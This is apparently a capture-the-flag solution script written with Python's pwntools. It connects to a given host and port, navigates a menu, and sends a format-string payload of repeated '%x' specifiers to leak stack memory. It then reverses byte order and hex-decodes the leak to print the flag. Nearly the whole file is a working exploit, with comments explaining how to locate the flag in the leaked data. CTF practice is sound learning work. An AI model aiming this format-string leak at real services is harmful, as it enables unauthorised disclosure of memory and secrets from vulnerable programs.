#!/usr/bin/python3
from pwn import *

if len(sys.argv) != 3:
    print(f"usage: {sys.argv[0]} HOST PORT")
    exit()

HOST = sys.argv[1]
PORT = int(sys.argv[2])

conn = remote(f"{HOST}", PORT)

# by using a dummy flag in local and printing a bunch of %x, you can find out WHERE the flag starts
# moreover, by printing a bunch of %x, you can see WHERE the flag ends by identifying the null byte
print(conn.sendlineafter(b'Name:', b'tobaka').decode())
print(conn.sendlineafter(b'Nickname:', b'tobaka').decode())
print(conn.sendlineafter(b'>', b'2').decode())
print(conn.sendlineafter(b'>', b'1').decode())
print(conn.sendlineafter(b'>', b'2').decode())
print(conn.sendlineafter(b'>', b'%x %x %x %x %x %x %x %x %x %x %x Flag-> %x %x %x %x %x %x %x %x %x %x %x %x').decode())
print(conn.recvline().decode())
print(conn.recvline().decode())
str = conn.recvline().decode() # this string contains our flag
print(str)
print(conn.recvall().decode());

conn.close()

# we first get our flag out of the string
flag_hex = re.search(r"Flag->(.*00)", str).group(1).strip()

# this incredible mess basically split the string in words (they're space separated), 
# reverse the byte order in each word, and then pack everything together
# in this way we get a whole hex string
flag_hex = "".join(["".join(reversed([f[i:i+2] for i in range(0, len(f), 2)])) for f in flag_hex.split(" ")])

# we kick out from the string the null byte and some junk after it
flag_hex = re.search(r"(.*)00", flag_hex).group(1)

# we finally decode the hex string in utf-8
flag = bytes.fromhex(flag_hex).decode('utf-8')
print(flag)
